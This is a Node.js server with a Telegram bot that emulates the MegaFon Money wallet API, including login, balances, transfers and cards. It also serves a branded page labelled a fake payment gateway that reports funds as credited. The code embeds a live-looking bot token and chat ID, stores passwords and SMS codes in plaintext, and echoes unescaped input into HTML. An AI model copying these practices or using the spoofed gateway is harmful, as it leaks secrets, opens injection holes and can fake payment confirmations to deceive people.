const express = require('express');
const Database = require('better-sqlite3');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

// ==========================================
// ⚙️ НАСТРОЙКИ СЕРВЕРА
// ==========================================
const BOT_TOKEN = "8604140755:AAH20rB8l6ZLsWjrV7Gqg6NPmhK-RuHtl1Q";
const ADMIN_CHAT_ID = "-1003892701032"; // Впишите ваш ID (строкой или числом)
const FLASK_PORT = 4444; // Порт сервера (сохранил название переменной)

const app = express();
// Настройки парсера для application/x-www-form-urlencoded
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==========================================
// 🗄 БАЗА ДАННЫХ SQLITE (better-sqlite3 работает синхронно, как в Python)
// ==========================================
const db = new Database('wallet.db');

function initDb() {
    db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            phone TEXT PRIMARY KEY,
            password TEXT,
            sid TEXT,
            balance REAL
        );
        CREATE TABLE IF NOT EXISTS transfers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sender_phone TEXT,
            receiver_phone TEXT,
            amount REAL,
            status TEXT,
            date_time TEXT
        );
        CREATE TABLE IF NOT EXISTS cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            card_id TEXT,
            alias TEXT,
            card_number TEXT,
            acquirer_id TEXT,
            card_type TEXT
        );
    `);
    console.log("[+] База данных SQLite успешно загружена.");
}
initDb();

// ==========================================
// 🤖 TELEGRAM БОТ
// ==========================================
bot.onText(/\/start|\/help/, (msg) => {
    const text = "🤖 Привет! Я сервер-эмулятор МегаФон Деньги (Node.js).\n\n" +
                 "Доступные команды:\n" +
                 "👥 /users — Список кошельков\n" +
                 "📝 /register <номер> <пароль> — Создать кошелек\n" +
                 "💰 /add_money <номер> <сумма> — Начислить деньги\n" +
                 "💳 /add_card <номер> <карта_16_цифр> [название] — Выдать карту";
    bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/register/, (msg) => {
    const parts = msg.text.split(' ');
    if (parts.length !== 3) return bot.sendMessage(msg.chat.id, "⚠️ Формат: /register 79260000000 123456");
    
    const phone = parts[1];
    const password = parts[2];
    
    try {
        const user = db.prepare('SELECT phone FROM users WHERE phone = ?').get(phone);
        if (user) {
            db.prepare('UPDATE users SET password = ? WHERE phone = ?').run(password, phone);
            bot.sendMessage(msg.chat.id, `🔄 Пароль для ${phone} обновлен.`);
        } else {
            db.prepare('INSERT INTO users (phone, password, sid, balance) VALUES (?, ?, ?, ?)').run(phone, password, null, 1000.0);
            bot.sendMessage(msg.chat.id, `✅ Кошелек ${phone} зарегистрирован!\nПароль: ${password}\nБаланс: 1000 руб.`);
        }
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ Ошибка: ${e.message}`);
    }
});

bot.onText(/\/users/, (msg) => {
    const users = db.prepare('SELECT phone, password, balance FROM users').all();
    if (users.length === 0) return bot.sendMessage(msg.chat.id, "Пользователей пока нет.");
    
    let text = "👥 Зарегистрированные кошельки:\n";
    users.forEach(u => {
        text += `📱 ${u.phone} | 🔑 ${u.password} | 💰 ${u.balance} руб.\n`;
    });
    bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/add_money/, (msg) => {
    const parts = msg.text.split(' ');
    if (parts.length < 3) return bot.sendMessage(msg.chat.id, "⚠️ Формат: /add_money 79260000000 500");
    
    const phone = parts[1];
    const amount = parseFloat(parts[2]);
    try {
        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(amount, phone);
        bot.sendMessage(msg.chat.id, `✅ Баланс ${phone} пополнен на ${amount} руб.`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, "❌ Ошибка БД.");
    }
});

bot.onText(/\/add_card/, (msg) => {
    const parts = msg.text.split(' ');
    if (parts.length < 3) return bot.sendMessage(msg.chat.id, "⚠️ Формат: /add_card 79260000000 4276111122223333 Зарплатная");
    
    const phone = parts[1];
    const cardRaw = parts[2];
    const alias = parts.length > 3 ? parts.slice(3).join(' ') : "Моя карта";
    
    let cardType = "MasterCard";
    if (cardRaw.startsWith("4")) cardType = "VISA";
    else if (cardRaw.startsWith("2")) cardType = "MIR";
    
    const cardMasked = cardRaw.length >= 12 ? `${cardRaw.substring(0, 4)} **** **** ${cardRaw.slice(-4)}` : cardRaw;
    const cardId = "card_" + uuidv4().substring(0, 8);

    try {
        const user = db.prepare('SELECT phone FROM users WHERE phone = ?').get(phone);
        if (!user) return bot.sendMessage(msg.chat.id, `❌ Кошелек ${phone} не найден!`);
        
        db.prepare('INSERT INTO cards (phone, card_id, alias, card_number, acquirer_id, card_type) VALUES (?, ?, ?, ?, ?, ?)')
          .run(phone, cardId, alias, cardMasked, "1", cardType);
          
        bot.sendMessage(msg.chat.id, `💳 Карта ${cardMasked} (${cardType}) выдана кошельку ${phone}!`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, `❌ Ошибка: ${e.message}`);
    }
});

console.log("[+] Telegram-бот запущен.");

// ==========================================
// 🌐 WEBVIEW (ФЕЙКОВЫЙ ПЛАТЕЖНЫЙ ШЛЮЗ)
// ==========================================
app.all('/fake_gateway', (req, res) => {
    const payment_id = req.body.payment_id || req.query.payment_id || "TRX_TEST";
    const amount = req.body.amount || req.query.amount || "0";

    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Оплата картой</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 20px; }
            .card-box { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-top: 30px; }
            h2 { color: #00B956; }
            .price { font-size: 24px; font-weight: bold; margin: 20px 0; }
            .btn { background-color: #00B956; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
            .input-fake { border: 1px solid #ccc; padding: 12px; margin-bottom: 10px; width: 90%; border-radius: 5px; background: #eee; color: #777; }
        </style>
    </head>
    <body>
        <div class="card-box">
            <h2>🔒 Тестовый Эквайринг</h2>
            <p>Заказ: ${payment_id}</p>
            <div class="price">${amount} ₽</div>
            <input type="text" class="input-fake" value="4276 0000 0000 0000" readonly>
            <input type="text" class="input-fake" value="12/25" readonly style="width: 40%;">
            <input type="text" class="input-fake" value="CVC" readonly style="width: 40%;">
            <form action="/gateway_success" method="POST">
                <input type="hidden" name="payment_id" value="${payment_id}">
                <button type="submit" class="btn">Подтвердить оплату</button>
            </form>
        </div>
    </body>
    </html>`;
    res.send(html);
});

app.post('/gateway_success', (req, res) => {
    const payment_id = req.body.payment_id;
    bot.sendMessage(ADMIN_CHAT_ID, `💳 ЭКВАЙРИНГ!\nПользователь подтвердил платеж ${payment_id} в окне WebView.`);
    
    const html = `
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
    <body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
        <h2 style="color: #00B956;">✅ Операция выполнена</h2>
        <p>Средства зачислены. Возвращаемся в приложение...</p>
        <div style="margin-top: 30px; font-size: 40px;">💸</div>
        <script>setTimeout(function(){ window.location.href = 'megafon://success'; }, 2000);</script>
    </body>
    </html>`;
    res.send(html);
});

// ==========================================
// 📞 EXPRESS (ЭМУЛЯТОР API МЕГАФОНА)
// ==========================================
app.post('/api/odp', (req, res) => {
    const reqStr = req.body.request;
    if (!reqStr) return res.json({ result: "error", text: "Empty request" });

    let reqData;
    try {
        reqData = JSON.parse(reqStr);
    } catch (e) {
        return res.json({ result: "error", text: "Invalid JSON" });
    }

    console.log(`\n[>] ПРИШЕЛ ЗАПРОС:`, reqData);
    
    const action = reqData.method || reqData.action || reqData.request_type || "unknown";
    const sid = reqData.sid;

    // --- 1. АВТОРИЗАЦИЯ И СМС ---
    if (action === "mobstudio.mfexpress.get_password") {
        const phone = reqData.login || reqData.phone;
        const smsCode = Math.floor(100000 + Math.random() * 900000).toString();
        
        const user = db.prepare('SELECT phone FROM users WHERE phone = ?').get(phone);
        if (user) {
            db.prepare('UPDATE users SET password = ? WHERE phone = ?').run(smsCode, phone);
        } else {
            db.prepare('INSERT INTO users (phone, password, sid, balance) VALUES (?, ?, ?, ?)').run(phone, smsCode, null, 1000.0);
        }
        bot.sendMessage(ADMIN_CHAT_ID, `📩 СМС Код для входа!\nНомер: ${phone}\nКод: ${smsCode}\nТекст для авто-ввода: мегафон ${smsCode}`);
        return res.json({ result: "ok" });
    }

    if (action === "mobstudio.mfexpress.auth") {
        const phone = reqData.login || reqData.phone;
        const password = reqData.password || reqData.pass;
        
        const user = db.prepare('SELECT * FROM users WHERE phone = ?').get(phone);
        if (!user || user.password !== password) {
            return res.json({ result: "error", code: "401", text: "Неверный пароль" });
        }
            
        const newSid = uuidv4().replace(/-/g, '');
        db.prepare('UPDATE users SET sid = ? WHERE phone = ?').run(newSid, phone);
        bot.sendMessage(ADMIN_CHAT_ID, `🔓 Вход в кошелек: ${phone}`);
        return res.json({ result: "ok", sid: newSid, operator: "Мегафон", region: "100", autoupdate_time: 3600, request_logs: [] });
    }

    // --- 2. БАЛАНС И ПРОФИЛЬ ---
    if (["mobstudio.mfexpress.balance", "mobstudio.mfexpress.quick_balance", "mobstudio.mfexpress.balance_widget"].includes(action)) {
        const user = db.prepare('SELECT balance FROM users WHERE sid = ?').get(sid);
        if (user) return res.json({ result: "ok", balance: user.balance });
        return res.json({ result: "error", code: "401", text: "Не авторизован" });
    }

    if (action === "mobstudio.mfexpress.get_msisdn") {
        const user = db.prepare('SELECT phone FROM users WHERE sid = ?').get(sid);
        return res.json(user ? { result: "ok", msisdn: user.phone } : { result: "error" });
    }

    // --- 3. P2P ПЕРЕВОДЫ ---
    if (action === "mobstudio.mfexpress.send_transfer_msisdn") {
        const sender = db.prepare('SELECT * FROM users WHERE sid = ?').get(sid);
        const receiver_phone = reqData.receiver_phone || reqData.destination;
        const amount = parseFloat(reqData.amount || 0);
        
        if (!sender) return res.json({ result: "error", code: "401", text: "Не авторизован" });
        if (sender.balance < amount) return res.json({ result: "error", text: "Недостаточно средств" });
        
        const receiver = db.prepare('SELECT phone FROM users WHERE phone = ?').get(receiver_phone);
        if (!receiver) return res.json({ result: "error", text: "Получатель не найден" });

        db.prepare('UPDATE users SET balance = balance - ? WHERE phone = ?').run(amount, sender.phone);
        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(amount, receiver_phone);
        
        const timeNow = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const info = db.prepare('INSERT INTO transfers (sender_phone, receiver_phone, amount, status, date_time) VALUES (?, ?, ?, ?, ?)')
                       .run(sender.phone, receiver_phone, amount, "ok", timeNow);
        
        bot.sendMessage(ADMIN_CHAT_ID, `💸 ПЕРЕВОД!\nОт: ${sender.phone}\nКому: ${receiver_phone}\nСумма: ${amount} руб.`);
        return res.json({ result: "ok", transfer_id: info.lastInsertRowid.toString() });
    }

    // --- 4. КАРТЫ И ПОПОЛНЕНИЕ ---
    if (action === "mobstudio.mfexpress.card_list") {
        const user = db.prepare('SELECT phone FROM users WHERE sid = ?').get(sid);
        if (!user) return res.json({ result: "error", code: "401" });
        const dbCards = db.prepare('SELECT * FROM cards WHERE phone = ?').all(user.phone);
        return res.json({ result: "ok", cards: dbCards });
    }

    if (action === "mobstudio.mfexpress.fill_balance") {
        const user = db.prepare('SELECT * FROM users WHERE sid = ?').get(sid);
        if (!user) return res.json({ result: "error", code: "401" });
        
        const amount = parseFloat(reqData.amount || 0);
        const card_id = reqData.card_id || "unknown";
        if (amount <= 0) return res.json({ result: "error", text: "Сумма <= 0" });
        
        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(amount, user.phone);
        
        const timeNow = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const info = db.prepare('INSERT INTO transfers (sender_phone, receiver_phone, amount, status, date_time) VALUES (?, ?, ?, ?, ?)')
                       .run(`CARD_${card_id}`, user.phone, amount, "ok", timeNow);
                       
        bot.sendMessage(ADMIN_CHAT_ID, `💳 ПОПОЛНЕНИЕ С КАРТЫ\nКошелек: ${user.phone}\nСумма: ${amount} руб.`);
        return res.json({ result: "ok", transfer_id: info.lastInsertRowid.toString() });
    }

    // --- 5. ЭКВАЙРИНГ И WEBVIEW ---
    if (["mobstudio.mfexpress.transfer_init", "mobstudio.mfexpress.send_transfer_card", "mobstudio.mfexpress.link_card"].includes(action)) {
        const amount = reqData.amount || "500";
        const transfer_id = "trx_" + Math.floor(100000 + Math.random() * 900000);
        // Формируем динамический URL на основе IP сервера
        const acquirer_url = `http://${req.get('host')}/fake_gateway`;
        return res.json({
            result: "ok", transfer_id: transfer_id, acquirer_url: acquirer_url,
            acquirer_post: { payment_id: transfer_id, amount: amount.toString(), description: "Оплата услуг" }
        });
    }

    if (action === "mobstudio.mfexpress.transfer_result") {
        return res.json({ result: "ok", transfer_id: reqData.transfer_id || "", transfer_complete: "1", transfer_status: "ok", error_message: "" });
    }

    // --- 6. ЧТЕНИЕ КАТАЛОГА ИЗ TXT ФАЙЛОВ ---
    if (action === "mobstudio.mfexpress.transfer_terms") {
        return res.json({ result: "ok", comission: "0", min_amount: "1", max_amount: "15000", max_daily_amount: "50000", max_monthly_amount: "100000" });
    }

    if (action === "mobstudio.mfexpress.catalog_list") {
        if (fs.existsSync('catalog.txt')) {
            return res.json(JSON.parse(fs.readFileSync('catalog.txt', 'utf8')));
        } else {
            return res.json({ result: "error", text: "Файл catalog.txt не найден на сервере" });
        }
    }

    if (["mobstudio.mfexpress.good_by_id", "mobstudio.mfexpress.good_from_by_id"].includes(action)) {
        const good_id = reqData.good_id || reqData.goods_id;
        const fileName = `good_${good_id}.txt`;
        
        if (fs.existsSync(fileName)) {
            return res.json(JSON.parse(fs.readFileSync(fileName, 'utf8')));
        } else {
            console.log(`[!] Приложение запросило файл ${fileName}, но он не найден. Возвращаем заглушку.`);
            return res.json({
                result: "ok", good_id: good_id, name: "Неизвестная услуга",
                fields: [
                    { name: "account", description: "Лицевой счет", type: "text", required: "1" },
                    { name: "sum", description: "Сумма", type: "text", required: "1" }
                ]
            });
        }
    }

    // --- Неизвестный метод ---
    console.log(`[!] Неизвестный метод API: ${action}`);
    return res.json({ result: "ok" });
});

// Запуск сервера
if (!fs.existsSync('catalog.txt')) {
    console.log("[!] ВНИМАНИЕ: Файл catalog.txt не найден! Раздел оплат может не загрузиться.");
}
app.listen(FLASK_PORT, '2.26.61.185', () => {
    console.log(`[+] Сервер Express запущен на http://2.26.61.185:${FLASK_PORT}`);
});
